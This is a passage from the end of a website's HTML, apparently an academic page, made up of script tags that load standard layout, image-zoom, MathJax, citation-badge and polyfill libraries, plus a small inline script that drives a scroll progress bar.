src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>